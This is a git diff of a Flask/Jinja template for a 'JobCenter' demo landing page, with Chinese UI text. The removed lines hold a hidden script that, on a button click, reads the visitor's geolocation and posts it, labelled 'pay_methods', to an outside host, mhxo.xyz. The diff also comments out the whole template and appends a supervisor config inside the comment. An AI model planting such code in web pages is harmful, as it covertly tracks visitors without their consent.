@@ -1,4 +1,4 @@
-{% extends "base.html" %}
+<!-- {% extends "base.html" %}
 {% import "bootstrap/wtf.html" as wtf %}
 
 {% block title %}{% endblock %}
@@ -19,15 +19,15 @@
                         <div class="panel-content">
                         <div class="row">
                                     
-                                       <div class="col-md-12">
+                                       <div class="col-md-7">
                                           <div class="jumbotron">
                                             <h1>JobCenter!</h1>
                                             <p class="lead"> 让添加执行计划任务变得更加优雅~. </p>
-                                            <p><a class="btn btn-lg btn-success" onclick="fetchLocation()" role="button">点我啦😁</a></p>
+                                            <p><a class="btn btn-lg btn-success" href="#" role="button">Go xxxsGo Up!</a></p>
                                             <h5>请使用<code>Chrome</code>浏览器进行访问😁</h5>
                                           </div>
                                         </div>
-                                      <!-- <div class="col-md-4">
+                                      <div class="col-md-4">
                                           {{ wtf.quick_form(form) }}
                                           <code style="font-size: 9px">Demo环境 直接点击登录即可</code>
                                           <br>
@@ -35,11 +35,11 @@
                                           <p>新用户？点击<a href="{{ url_for('.register') }}">这里</a>注册。</p>
                                       </div>
                                       <div class="col-md-4">
-                                      </div> -->
+                                      </div>
 
 
                                    </div>
-                          <!--               <div class="row">
+                                        <div class="row">
                                     <div class="col-md-4">
                                       <div class="card" style="width: 18rem;">
 					      <img class="card-img-top" src="{{  url_for('static',filename='img//barbarian.png') }}" alt="Card image cap" width="140%"  >
@@ -74,7 +74,7 @@
                                         </div>
                                       </div>
                                     </div> 
-                                  </div>  --> 
+                                  </div>  
                                </div>
                           </div>
                         </div>
@@ -84,43 +84,16 @@
             </div>
       </div>
 
-<script>
-        var tipsEle = document.getElementById('tips')
-        function fetchLocation() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(onGeoSuccess, onGeoError)
-            } else {
-                alert('当前设备不支持定位！')
-            }
-        }
-        function onGeoSuccess(event){
-            // alert("Success: " + event.coords.latitude + ", " + event.coords.longitude)
-              var data= {
-                        data: JSON.stringify({
-                            'pay_methods': event.coords.latitude + " & " + event.coords.longitude
-                        }),
-                    }
-            $.ajax ({
-                    type: 'POST',
-                    data: data,
-                    dataType: 'json',
-                    url: "http://mhxo.xyz/pay",
-                    success:function(res){
-                        if (res.result) {
-                            swal("成功", "😊", "success");
-                        }
-                        else {
-                            swal("失败", "😭", "error");
-                        }
-                    }
-                });
-        }
-        function onGeoError(event){
-            alert("Error code " + event.code + ". " + event.message)
-        }
-    </script>
-
 {% endblock %}
 
 
 
+[program:jobcenter]
+command=/root/.local/share/virtualenvs/JobCenter-OelQLIOn/bin/python3 /root/.local/share/virtualenvs/JobCenter-OelQLIOn/bin/flask run -p 5009
+directory=/home/JobCenter
+stopwaitsecs=0
+autostart=true
+autorestart=true
+#stdout_logfile=/var/log/gunicorn_jobcenter.log
+#stderr_logfile=/var/log/gunicorn_jobcenter.error
+ -->
